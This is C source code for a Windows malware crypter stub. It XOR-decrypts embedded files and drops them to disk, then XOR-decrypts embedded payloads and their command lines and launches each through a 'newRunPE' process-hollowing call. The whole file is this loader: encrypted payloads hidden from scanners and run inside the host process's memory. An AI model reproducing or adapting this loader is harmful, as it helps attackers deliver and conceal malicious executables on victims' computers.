#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include "runPE.h"
#include "payloads.h"

int main() {
	TCHAR szFilePath[1024];
	FILE *currentDropfile;
	
	// Retrieve path to current module
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);	
	
	// Iterate dropfiles
	for(int i=0; i < dropfileCount; i++) {		
		// Decrypt dropfile before dropping
		for(int j=0; j < dropfileSizes[i]; j++) {
			dropfiles[i][j] = dropfiles[i][j] ^ dropfileKeys[i];
		}
		
		// Decrypt the dropfile destination before dropping
		for(int j=0; j < dropfileDestinationSizes[i]; j++) {
			dropfileDestinations[i][j] = dropfileDestinations[i][j] ^ dropfileKeys[i];
		}				
		
		// Drop file on destination
		printf("Attempting to drop file %d, file size is %ld, destination is '%s'\n", i, dropfileSizes[i], (char *) dropfileDestinations[i]);				
		if(access((char *) dropfileDestinations[i], F_OK) == 0) {
			printf("Desired file already exists. Skip dropping.\n");
		} else {
			currentDropfile = fopen((char *) dropfileDestinations[i], "wb");
			if(fwrite(dropfiles[i], dropfileSizes[i], 1, currentDropfile)) {
				printf("Success.\n");
			}	
			fclose(currentDropfile);				
		}				
	}	
	
	// Iterate payloads
	for(int i=0; i < payloadCount; i++) {	
		// Decrypt payload before instanciation
		for(int j=0; j < payloadSizes[i]; j++) {
			payloads[i][j] = payloads[i][j] ^ keys[i];
		}
		
		// Decrypt the payload's command line before instanciation
		for(int j=0; j < commandLineSizes[i]; j++) {
			commandLines[i][j] = commandLines[i][j] ^ keys[i];
		}
				
		// Spawn payloads as runPE
		printf("\n Spawning payload %d, command line is '%s'\n", i, (char *) commandLines[i]);		
		newRunPE(LPSTR(szFilePath), payloads[i], LPTSTR(commandLines[i]));			
	}
				
	return 0;
}	
